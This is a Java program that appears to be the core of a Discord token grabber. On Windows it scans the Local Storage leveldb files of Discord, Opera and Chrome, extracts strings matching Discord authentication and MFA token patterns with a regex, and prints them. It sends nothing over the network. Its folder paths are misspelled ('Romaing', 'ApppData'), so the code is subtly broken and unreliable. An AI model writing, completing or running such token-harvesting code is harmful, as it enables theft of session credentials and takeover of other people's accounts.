import javax.sound.midi.SysexMessage;
import java.io.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {

    public static int cx = 0;
    public static StringBuilder webhooks = new StringBuilder();
    public static List<String> paths = new ArrayList<>();

    public static void main(String[] args) {
        getTokens();
    }

    public static void consoleLog(Object o) {
        System.out.println(o);
    }

    public static String getOSName() {
        return System.getProperty("os.name");
    }

    public static String getUserHome(){
        return System.getProperty("user.home");
    }

    public static void addPaths(){
        paths.add(getUserHome() + "/AppData/Romaing/discord/Local Storage/leveldb/");
        paths.add(getUserHome() + "/AppData/Romaing/discordptb/Local Storage/leveldb/");
        paths.add(getUserHome() + "/AppData/Romaing/discordcanary/Local Storage/leveldb/");
        paths.add(getUserHome() + "/AppData/Romaing/Opera Software/Opera Stable/Local Storage/leveldb/");
        paths.add(getUserHome() + "/ApppData/Romaing/Google/Chrome/User Data/Default/Local Storage/leveldb");


    }

    public static void searchUp() {
        try{

            for(String path: paths){
                File f = new File(path);
                String[] pathnames = f.list();
                if(pathnames == null) continue;

                for(String pathname : pathnames){
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;

                        while ((strLine = br.readLine()) != null) {
                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);
                            while (m.find()) {
                                if(cx > 0){
                                    webhooks.append("\n");
                                }
                                webhooks.append(" ").append(m.group());
                                cx++;

                            }

                        }

                    } catch(Exception e){

                    }
                }
            }

        } catch(Exception e){

        }
    }
    public static void getTokens(){
        String osName = getOSName();
        if(osName.contains("Windows")){
            addPaths();
            searchUp();
            consoleLog(webhooks);
        }
    }
}